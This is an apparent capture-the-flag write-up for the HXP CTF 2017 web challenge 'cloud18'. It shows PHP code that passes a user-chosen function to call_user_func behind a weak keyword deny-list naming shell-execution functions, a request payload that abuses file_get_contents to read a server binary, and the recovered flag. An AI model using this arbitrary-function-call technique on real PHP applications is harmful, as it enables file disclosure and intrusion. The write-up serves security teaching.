---
title: HXP CTF 2017 - cloud18
date: '2017-11-19'
lastmod: '2019-04-07T13:46:27+02:00'
categories:
- ctf_hxp2017
- writeup
- hxp2017
tags:
- web
authors:
- chq-matteo
---

We can:
- login
- register a new user

Once we are authenticated, we can use a text editor.

We take choose a function, write a regex, write some text and have the text that matches the regex replaced with the output of our functions. (line 35-37)
```php
    $editedText = preg_replace_callback("/" . $_POST["regex"] . "/", function ($matches) {
        return call_user_func($_POST["method"], $matches[0]);
    }, $_POST["text"]);
```

The client provides a couple of examples (line 43-48)
```html
        <select name="method">
            <option value="" disabled selected>select a method</option>
            <option value="strtoupper">to upper case</option>
            <option value="strtolower">to lower case</option>
            <option value="ucfirst">first letter to upper case</option>
        </select>
```

However the method is only checked by this snippet (line 7-9)
```php
if (preg_match("/exec|system|passthru|`|proc_open|popen/", strtolower($_POST["method"].$_POST["text"])) != 0) {
    exit("Do you really think you could pass something to the command line? Functions like this are often disabled! Maybe have a look at the source?");
}
```

In index.php we notice that we have to execute /usr/bin/get_flag to get the flag
```php
		echo "<div class='alert success'>" . shell_exec("/usr/bin/get_flag") . "</div>";
```

However we cannot use shell_exec.
But we can download the whole binary
We craft a request that includes the file in the webpage and then download it.
```
method:file_get_contents
regex:\/usr\/bin\/get_flag
text:/usr/bin/get_flag
```

Now we should get some information reversing the binary.

Luckily the old `strings get_flag | grep hxp` worked
`hxp{Th1s_w2sn't_so_h4rd_now_do_web_of_ages!!!Sorry_f0r_f1rst_sh1tty_upload}`
